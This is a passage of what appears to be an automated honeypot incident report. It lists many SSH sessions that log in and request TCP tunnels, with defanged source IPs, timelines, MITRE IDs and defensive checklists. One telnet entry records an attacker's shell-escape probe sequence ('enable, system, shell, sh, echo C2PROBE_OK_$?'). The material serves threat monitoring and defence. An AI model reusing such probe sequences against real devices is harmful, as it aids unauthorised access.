- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b88b394c40

| Field | Detail |
|---|---|
| **Source IP** | `157.20.228[.]20` |
| **First Seen** | 2026-08-01 05:47 |
| **Last Seen** | 2026-08-01 05:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:47:52` | `cowrie.session.connect` |
| `2026-08-01 05:47:52` | `cowrie.client.version` |
| `2026-08-01 05:47:52` | `cowrie.client.kex` |
| `2026-08-01 05:47:54` | `cowrie.login.success` |
| `2026-08-01 05:47:54` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.228[.]20` to AbuseIPDB if not already reported
- [ ] Block `157.20.228[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e9be50ed519

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-08-01 05:48 |
| **Last Seen** | 2026-08-01 05:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:48:47` | `cowrie.session.connect` |
| `2026-08-01 05:48:47` | `cowrie.client.version` |
| `2026-08-01 05:48:47` | `cowrie.client.kex` |
| `2026-08-01 05:48:48` | `cowrie.login.success` |
| `2026-08-01 05:48:49` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c04d0219f8c

| Field | Detail |
|---|---|
| **Source IP** | `203.192.247[.]84` |
| **First Seen** | 2026-08-01 05:48 |
| **Last Seen** | 2026-08-01 05:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:48:57` | `cowrie.session.connect` |
| `2026-08-01 05:48:58` | `cowrie.client.version` |
| `2026-08-01 05:48:58` | `cowrie.client.kex` |
| `2026-08-01 05:48:59` | `cowrie.login.success` |
| `2026-08-01 05:49:00` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.247[.]84` to AbuseIPDB if not already reported
- [ ] Block `203.192.247[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0817b7655cb

| Field | Detail |
|---|---|
| **Source IP** | `213.32.20[.]78` |
| **First Seen** | 2026-08-01 05:49 |
| **Last Seen** | 2026-08-01 05:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:49:57` | `cowrie.session.connect` |
| `2026-08-01 05:49:57` | `cowrie.client.version` |
| `2026-08-01 05:49:57` | `cowrie.client.kex` |
| `2026-08-01 05:49:58` | `cowrie.login.success` |
| `2026-08-01 05:49:58` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.32.20[.]78` to AbuseIPDB if not already reported
- [ ] Block `213.32.20[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a26a8801c1

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-08-01 05:50 |
| **Last Seen** | 2026-08-01 05:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:50:04` | `cowrie.session.connect` |
| `2026-08-01 05:50:04` | `cowrie.client.version` |
| `2026-08-01 05:50:04` | `cowrie.client.kex` |
| `2026-08-01 05:50:06` | `cowrie.login.success` |
| `2026-08-01 05:50:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9306adfd1531

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-01 05:50 |
| **Last Seen** | 2026-08-01 05:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:50:17` | `cowrie.session.connect` |
| `2026-08-01 05:50:18` | `cowrie.client.version` |
| `2026-08-01 05:50:18` | `cowrie.client.kex` |
| `2026-08-01 05:50:18` | `cowrie.login.success` |
| `2026-08-01 05:50:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f075b02852a0

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-01 05:50 |
| **Last Seen** | 2026-08-01 05:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:50:24` | `cowrie.session.connect` |
| `2026-08-01 05:50:26` | `cowrie.client.version` |
| `2026-08-01 05:50:26` | `cowrie.client.kex` |
| `2026-08-01 05:50:27` | `cowrie.login.success` |
| `2026-08-01 05:50:28` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7bb8c279b54

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-08-01 05:50 |
| **Last Seen** | 2026-08-01 05:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:50:35` | `cowrie.session.connect` |
| `2026-08-01 05:50:36` | `cowrie.client.version` |
| `2026-08-01 05:50:36` | `cowrie.client.kex` |
| `2026-08-01 05:50:37` | `cowrie.login.success` |
| `2026-08-01 05:50:37` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ea5d2405b8

| Field | Detail |
|---|---|
| **Source IP** | `196.203.231[.]220` |
| **First Seen** | 2026-08-01 05:50 |
| **Last Seen** | 2026-08-01 05:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:50:42` | `cowrie.session.connect` |
| `2026-08-01 05:50:42` | `cowrie.client.version` |
| `2026-08-01 05:50:42` | `cowrie.client.kex` |
| `2026-08-01 05:50:42` | `cowrie.login.success` |
| `2026-08-01 05:50:43` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.203.231[.]220` to AbuseIPDB if not already reported
- [ ] Block `196.203.231[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a6fe9bf961d

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-01 05:52 |
| **Last Seen** | 2026-08-01 05:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:52:02` | `cowrie.session.connect` |
| `2026-08-01 05:52:02` | `cowrie.client.version` |
| `2026-08-01 05:52:02` | `cowrie.client.kex` |
| `2026-08-01 05:52:05` | `cowrie.login.success` |
| `2026-08-01 05:52:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b97683b34f7

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-08-01 05:52 |
| **Last Seen** | 2026-08-01 05:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:52:12` | `cowrie.session.connect` |
| `2026-08-01 05:52:12` | `cowrie.client.version` |
| `2026-08-01 05:52:12` | `cowrie.client.kex` |
| `2026-08-01 05:52:14` | `cowrie.login.success` |
| `2026-08-01 05:52:14` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f148b28edd66

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-08-01 05:52 |
| **Last Seen** | 2026-08-01 05:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:52:46` | `cowrie.session.connect` |
| `2026-08-01 05:52:46` | `cowrie.client.version` |
| `2026-08-01 05:52:46` | `cowrie.client.kex` |
| `2026-08-01 05:52:48` | `cowrie.login.success` |
| `2026-08-01 05:52:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3de0a84e19

| Field | Detail |
|---|---|
| **Source IP** | `190.188.60[.]235` |
| **First Seen** | 2026-08-01 05:52 |
| **Last Seen** | 2026-08-01 05:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, echo C2PROBE_OK_$?` |
| **TTPs (MITRE)** | T1059.004 · T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:52:50` | `cowrie.session.connect` |
| `2026-08-01 05:52:50` | `cowrie.telnet.option` |
| `2026-08-01 05:52:50` | `cowrie.login.success` |
| `2026-08-01 05:52:51` | `cowrie.session.params` |
| `2026-08-01 05:52:51` | `cowrie.telnet.option` |
| `2026-08-01 05:52:51` | `cowrie.telnet.option` |
| `2026-08-01 05:52:51` | `cowrie.command.input` |
| `2026-08-01 05:52:51` | `cowrie.command.failed` |
| `2026-08-01 05:52:52` | `cowrie.command.input` |
| `2026-08-01 05:52:52` | `cowrie.command.failed` |
| `2026-08-01 05:52:52` | `cowrie.command.input` |
| `2026-08-01 05:52:52` | `cowrie.command.failed` |
| `2026-08-01 05:52:52` | `cowrie.command.input` |
| `2026-08-01 05:52:52` | `cowrie.command.input` |
| `2026-08-01 05:52:55` | `cowrie.log.closed` |
| `2026-08-01 05:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.188.60[.]235` to AbuseIPDB if not already reported
- [ ] Block `190.188.60[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb59e970786

| Field | Detail |
|---|---|
| **Source IP** | `111.39.167[.]59` |
| **First Seen** | 2026-08-01 05:53 |
| **Last Seen** | 2026-08-01 05:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:53:54` | `cowrie.session.connect` |
| `2026-08-01 05:53:56` | `cowrie.client.version` |
| `2026-08-01 05:53:56` | `cowrie.client.kex` |
| `2026-08-01 05:53:59` | `cowrie.login.success` |
| `2026-08-01 05:54:00` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.167[.]59` to AbuseIPDB if not already reported
- [ ] Block `111.39.167[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91220822bcc2

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-01 05:54 |
| **Last Seen** | 2026-08-01 05:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:54:06` | `cowrie.session.connect` |
| `2026-08-01 05:54:06` | `cowrie.client.version` |
| `2026-08-01 05:54:06` | `cowrie.client.kex` |
| `2026-08-01 05:54:08` | `cowrie.login.success` |
| `2026-08-01 05:54:09` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4c3f61ae5f

| Field | Detail |
|---|---|
| **Source IP** | `117.254.104[.]107` |
| **First Seen** | 2026-08-01 05:55 |
| **Last Seen** | 2026-08-01 05:55 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:55:38` | `cowrie.session.connect` |
| `2026-08-01 05:55:39` | `cowrie.client.version` |
| `2026-08-01 05:55:39` | `cowrie.client.kex` |
| `2026-08-01 05:55:42` | `cowrie.login.success` |
| `2026-08-01 05:55:44` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.254.104[.]107` to AbuseIPDB if not already reported
- [ ] Block `117.254.104[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b83e34cd6a

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-01 05:55 |
| **Last Seen** | 2026-08-01 05:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:55:54` | `cowrie.session.connect` |
| `2026-08-01 05:55:54` | `cowrie.client.version` |
| `2026-08-01 05:55:54` | `cowrie.client.kex` |
| `2026-08-01 05:55:56` | `cowrie.login.success` |
| `2026-08-01 05:55:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be47b5a25400

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-08-01 05:57 |
| **Last Seen** | 2026-08-01 05:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:57:42` | `cowrie.session.connect` |
| `2026-08-01 05:57:42` | `cowrie.client.version` |
| `2026-08-01 05:57:42` | `cowrie.client.kex` |
| `2026-08-01 05:57:45` | `cowrie.login.success` |
| `2026-08-01 05:57:45` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251cb3765fe5

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-08-01 05:57 |
| **Last Seen** | 2026-08-01 05:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:57:43` | `cowrie.session.connect` |
| `2026-08-01 05:57:44` | `cowrie.client.version` |
| `2026-08-01 05:57:44` | `cowrie.client.kex` |
| `2026-08-01 05:57:47` | `cowrie.login.success` |
| `2026-08-01 05:57:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de84255049de

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-08-01 05:57 |
| **Last Seen** | 2026-08-01 05:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:57:51` | `cowrie.session.connect` |
| `2026-08-01 05:57:51` | `cowrie.client.version` |
| `2026-08-01 05:57:51` | `cowrie.client.kex` |
| `2026-08-01 05:57:52` | `cowrie.login.success` |
| `2026-08-01 05:57:52` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7f3fe46d20

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-08-01 05:57 |
| **Last Seen** | 2026-08-01 05:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:57:53` | `cowrie.session.connect` |
| `2026-08-01 05:57:53` | `cowrie.client.version` |
| `2026-08-01 05:57:53` | `cowrie.client.kex` |
| `2026-08-01 05:57:55` | `cowrie.login.success` |
| `2026-08-01 05:57:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deb7939ae4c4

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-01 05:58 |
| **Last Seen** | 2026-08-01 05:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:58:01` | `cowrie.session.connect` |
| `2026-08-01 05:58:02` | `cowrie.client.version` |
| `2026-08-01 05:58:02` | `cowrie.client.kex` |
| `2026-08-01 05:58:03` | `cowrie.login.success` |
| `2026-08-01 05:58:04` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa51c59a0d6d

| Field | Detail |
|---|---|
| **Source IP** | `210.245.95[.]11` |
| **First Seen** | 2026-08-01 05:58 |
| **Last Seen** | 2026-08-01 05:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:58:52` | `cowrie.session.connect` |
| `2026-08-01 05:58:53` | `cowrie.client.version` |
| `2026-08-01 05:58:53` | `cowrie.client.kex` |
| `2026-08-01 05:58:55` | `cowrie.login.success` |
| `2026-08-01 05:58:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.95[.]11` to AbuseIPDB if not already reported
- [ ] Block `210.245.95[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05a4e08bb28

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]92` |
| **First Seen** | 2026-08-01 05:59 |
| **Last Seen** | 2026-08-01 05:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:59:01` | `cowrie.session.connect` |
| `2026-08-01 05:59:02` | `cowrie.client.version` |
| `2026-08-01 05:59:02` | `cowrie.client.kex` |
| `2026-08-01 05:59:03` | `cowrie.login.success` |
| `2026-08-01 05:59:04` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]92` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4e6a116308

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]9` |
| **First Seen** | 2026-08-01 05:59 |
| **Last Seen** | 2026-08-01 05:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:59:02` | `cowrie.session.connect` |
| `2026-08-01 05:59:03` | `cowrie.client.version` |
| `2026-08-01 05:59:03` | `cowrie.client.kex` |
| `2026-08-01 05:59:05` | `cowrie.login.success` |
| `2026-08-01 05:59:05` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]9` to AbuseIPDB if not already reported
